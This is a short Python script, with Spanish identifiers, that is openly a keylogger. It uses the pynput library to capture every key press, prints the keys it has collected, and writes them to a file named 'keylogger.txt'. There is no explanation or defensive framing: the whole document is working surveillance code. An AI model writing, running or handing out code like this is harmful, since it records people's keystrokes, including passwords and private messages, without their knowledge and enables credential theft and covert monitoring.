import pynput

teclas=[]
def presionarT(t):
    teclas.append(t)
    print("teclas",teclas)
    insertarT(teclas)

def insertarT(t):
    with open('keylogger.txt','w') as keylogger:
        for teclas in t:
            teclas = str(teclas).replace("'","")
            if teclas == "Key.space":
               teclas = " "
               keylogger.write(teclas)
            else:
                keylogger.write(teclas)

with pynput.keyboard.Listener(on_press=presionarT) as listener :
    listener.join()